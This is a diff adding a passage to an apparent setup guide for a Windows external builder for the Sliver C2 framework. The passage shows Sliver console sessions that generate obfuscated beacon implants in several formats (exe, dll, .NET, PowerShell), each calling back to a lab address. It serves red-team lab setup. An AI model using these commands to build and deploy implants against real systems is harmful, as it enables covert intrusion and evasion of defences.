@@ -120,3 +120,70 @@ $ mv winbuilder_192.168.161.50.cfg /path/to/ansible_configs/builder.cfg
 $ cd ansible_configs/
 $ ansible-playbook -i inventory/win_inventory.yml win-playbook_local.yml
 ```
+
+Now start a sliver-client on your kali machine and notice the builder was registered successfully and you can generate exe, dll, dotnet, powershell implants.
+
+```
+sliver > generate beacon --http http://192.168.161.50 -E -f dotnet
+
+[*] Using external builder: DESKTOP-H8C0U5U
+[*] Externally generating new windows/amd64 beacon implant binary (1m0s)
+[*] Symbol obfuscation is enabled
+[*] Creating external build ... done
+ ⠹  External build acknowledged by builder (template: sliver) ... 1m32s
+sliver > builders
+
+ Name              Operator     Templates   Platform        Compiler Targets
+================= ============ =========== =============== ==========================
+ DESKTOP-H8C0U5U   winbuilder   sliver      windows/amd64   EXECUTABLE:windows/amd64
+                                                            DOTNET:windows/amd64
+                                                            POWERSHELL:windows/amd64
+                                                            SHARED_LIB:windows/amd64
+                                                            SERVICE:windows/386
+                                                            SERVICE:windows/amd64
+                                                            SHELLCODE:windows/386
+                                                            SHELLCODE:windows/amd64
+
+sliver > generate beacon --http http://192.168.161.50 -E -f dotnet
+
+[*] Using external builder: DESKTOP-H8C0U5U
+[*] Externally generating new windows/amd64 beacon implant binary (1m0s)
+[*] Symbol obfuscation is enabled
+[*] Creating external build ... done
+[*] Build completed in 2m1s
+[*] Build name: PRACTICAL_PIANO (9650688 bytes)
+[*] Implant saved to /home/kali/sliver-builds/a.exe
+
+sliver > generate beacon --http http://192.168.161.50 -E -f powershell
+
+[*] Using external builder: DESKTOP-H8C0U5U
+[*] Externally generating new windows/amd64 beacon implant binary (1m0s)
+[*] Symbol obfuscation is enabled
+[*] Creating external build ... done
+[*] Build completed in 1m38s
+[*] Build name: OPTIMISTIC_LAUNDRY (12872831 bytes)
+[*] Implant saved to /home/kali/sliver-builds/a.ps1
+
+sliver > generate beacon --http http://192.168.161.50 -E -f exe
+
+[*] Using external builder: DESKTOP-H8C0U5U
+[*] Externally generating new windows/amd64 beacon implant binary (1m0s)
+[*] Symbol obfuscation is enabled
+[*] Creating external build ... done
+[*] Build completed in 1m18s
+[*] Build name: STRAIGHT_DEPLOYMENT (3352576 bytes)
+[*] Implant saved to /home/kali/sliver-builds/STRAIGHT_DEPLOYMENT.exe
+
+sliver > generate beacon --http http://192.168.161.50 -E -f shared
+
+[*] Using external builder: DESKTOP-H8C0U5U
+[*] Externally generating new windows/amd64 beacon implant binary (1m0s)
+[*] Symbol obfuscation is enabled
+[*] Creating external build ... done
+[*] Build completed in 1m16s
+[*] Build name: LEGAL_LENGTH (3431424 bytes)
+[*] Implant saved to /home/kali/sliver-builds/LEGAL_LENGTH.dll
+
+sliver >
+```
+
